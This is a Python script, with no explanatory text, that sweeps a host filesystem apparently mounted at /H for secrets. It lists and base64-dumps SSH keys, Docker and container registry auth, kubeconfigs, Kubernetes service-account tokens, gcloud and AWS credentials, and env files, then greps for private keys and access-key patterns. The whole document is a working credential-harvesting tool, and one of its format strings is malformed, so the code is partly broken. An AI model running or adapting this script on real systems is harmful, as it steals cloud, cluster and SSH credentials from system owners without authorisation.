import os,glob,base64,sqlite3,hashlib,re,sys
H='/H'
buf=[]; used=[0]; CAP=112000; done=[False]
def out(s=''):
    s=str(s)
    if used[0]+len(s)+1>CAP:
        if not done[0]:
            buf.append('@@OUTPUT_TRUNCATED_AT_%d'%used[0]); done[0]=True
        return
    buf.append(s); used[0]+=len(s)+1

def mode(p):
    try:
        st=os.lstat(p); 
        if os.path.islink(p): return 'l',st.st_size
        if os.path.isdir(p): return 'd',st.st_size
        return 'f',st.st_size
    except Exception as e: return '?',0

def listing(root,maxdepth=2,maxent=150,label=''):
    out('@@LIST %s exists=%s'%(root,os.path.exists(root)))
    if not os.path.exists(root): return
    n=0
    for dp,dn,fn in os.walk(root,followlinks=False):
        rel=dp[len(root):]
        d=rel.count('/')
        if d>=maxdepth: dn[:]=[]
        dn.sort(); fn.sort()
        for name in dn+fn:
            p=os.path.join(dp,name); t,sz=mode(p)
            extra=''
            if t=='l':
                try: extra=' -> '+os.readlink(p)
                except: pass
            out('%@%s %s %d%s'%(t,p,oct(os.lstat(p).st_mode)[-4:] if t!='?' else '----',sz,extra))
            n+=1
            if n>=maxent:
                out('@@LISTCAP %s'%root); return

def dbdump(p,cap=40000):
    out('@@SQLITE %s size=%d'%(p,os.path.getsize(p)))
    try:
        con=sqlite3.connect('file:%s?mode=ro'%p,uri=True)
        cur=con.cursor()
        tabs=[r[0] for r in cur.execute("select name from sqlite_master where type='table'")]
        out('@@SQLITE_TABLES %s'%(','.join(tabs)[:800]))
        usedb=0
        for t in tabs[:20]:
            try:
                rows=cur.execute('select * from "%s" limit 20'%t).fetchall()
            except Exception as e:
                out('@@SQLITE_ERR %s %r'%(t,e)); continue
            for r in rows:
                s=repr(r)[:600]
                usedb+=len(s)
                if usedb>cap: out('@@SQLITE_CAP %s'%t); break
                out('@@ROW %s %s'%(t,s))
        con.close()
    except Exception as e:
        out('@@SQLITE_FAIL %r'%e)

def dump(p,cap=20000,note=''):
    try:
        if os.path.islink(p) or not os.path.isfile(p):
            out('@@NOTFILE %s %s'%(p,note)); return
        sz=os.path.getsize(p)
        if p.endswith(('.db','.sqlite')) and sz<5_000_000:
            dbdump(p); return
        data=open(p,'rb').read(cap)
        h=hashlib.sha256(open(p,'rb').read(min(sz,2_000_000))).hexdigest()[:16]
        out('@@FILE %s size=%d sha256_16=%s trunc=%s'%(p,sz,h,sz>cap))
        b=base64.b64encode(data).decode()
        for i in range(0,len(b),2400):
            out('@@B64 '+b[i:i+2400])
        out('@@ENDFILE %s'%p)
    except Exception as e:
        out('@@DUMP_ERR %s %r'%(p,e))

out('@@ROOT ' + ' '.join(sorted(os.listdir(H))[:80]))
for _d in ('etc','root','var','usr','opt','home'):
    out('@@ROOTCHK %s exists=%s'%(_d,os.path.exists(H+'/'+_d)))
out('@@HOST hostname='+ (open(H+'/etc/hostname').read().strip() if os.path.exists(H+'/etc/hostname') else '?'))
for f in ('/etc/hosts','/etc/resolv.conf','/etc/os-release','/etc/machine-id'):
    if os.path.exists(H+f):
        try: out('@@SYS %s :: %s'%(f,open(H+f,'rb').read(1200).decode('utf-8','replace').replace('\n',' | ')[:700]))
        except Exception as e: out('@@SYSERR %s %r'%(f,e))

# ---- Phase 1: narrow existence / listing ----
NARROW=[
 ('root/.docker',3,60),('home',3,120),('etc/docker',3,60),('etc/containerd',3,100),
 ('etc/buildkit',3,60),('var/lib/buildkit',2,60),('root/.config',4,150),
 ('root/.kube',3,40),('root/.ssh',2,40),('var/lib/kubelet',3,120),('etc/kubernetes',3,80),
 ('var/run/secrets',4,60),('etc/systemd/system',3,140),('opt',3,120),
 ('var/lib',1,90),('root/.aws',2,20),('root/.gsutil',2,20),('etc/containers',3,40),
 ('etc/cloud',3,60),('var/lib/cloud',3,60),('etc/ssh',2,60),('var/lib/google',3,40),
 ('etc/google',3,60),
]
for p,d,e in NARROW:
    listing(H+'/'+p,d,e)

# ---- Phase 2: high-value content ----
PRI=[]
for pat in ['root/.docker/config.json','home/*/.docker/config.json','root/.config/containers/auth.json',
            'home/*/.config/containers/auth.json','etc/docker/daemon.json','etc/containerd/config.toml',
            'etc/buildkit/buildkitd.toml','etc/containerd/certs.d/*/*','var/lib/kubelet/config.yaml',
            'root/.config/gcloud/application_default_credentials.json','root/.config/gcloud/credentials.db',
            'root/.config/gcloud/access_tokens.db','root/.config/gcloud/configurations/*',
            'home/*/.config/gcloud/application_default_credentials.json','root/.kube/config',
            'home/*/.kube/config','etc/environment','etc/kubernetes/*','etc/kubernetes/**/*',
            'var/run/secrets/kubernetes.io/serviceaccount/*','var/lib/kubelet/pki/*',
            'root/.aws/credentials','root/.aws/config','home/*/.aws/credentials','root/.gsutil/*',
            'root/.boto','etc/ssh/ssh_host_*','root/.ssh/*','opt/*/env*','opt/*/*.env',
            'var/lib/railway*/*.env','var/lib/railway*/*.json','etc/systemd/system/*.d/*.conf',
            'etc/cloud/*','var/lib/cloud/instance/user-data.txt','etc/google/*','etc/google/**/*',
            'var/lib/google/**/*']:
    for p in sorted(glob.glob(H+'/'+pat,recursive=True))[:25]:
        dump(p,20000)

# ---- Phase 3: fallback grep ----
PAT=re.compile(rb'AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|service_account|private_key|pkg\.dev|cloudkms|kms|tailscale|BEGIN [A-Z ]*PRIVATE KEY|googleapis|kubeconfig|gcloud|GOOGLE_APPLICATION|conductor|SESSION_SECRET')
hits=0;seen=0;stop=False
for root in ('/H/etc','/H/opt','/H/usr/local/etc','/H/var/lib/railwayapp'):
    if stop: break
    for dp,dn,fn in os.walk(root,followlinks=False):
        dn[:]=[d for d in dn if d not in ('.git','node_modules')]
        for f in fn:
            if seen>800 or hits>140: stop=True; break
            p=os.path.join(dp,f)
            try:
                if os.path.islink(p): continue
                st=os.stat(p)
                if not os.path.isfile(p) or st.st_size>262144: continue
            except Exception: continue
            seen+=1
            try: b=open(p,'rb').read()
            except Exception: continue
            for m in PAT.finditer(b):
                s=max(0,m.start()-50); snip=b[s:m.end()+100].decode('utf-8','replace').replace('\n',' ').replace('\r',' ')
                out('@@HIT %s :: %s'%(p,snip[:220]))
                hits+=1
                if hits>140: stop=True; break
            if stop: break
out('@@STATS files_scanned=%d hits=%d out_chars=%d'%(seen,hits,used[0]))
sys.stdout.write('\n'.join(buf)+'\n')
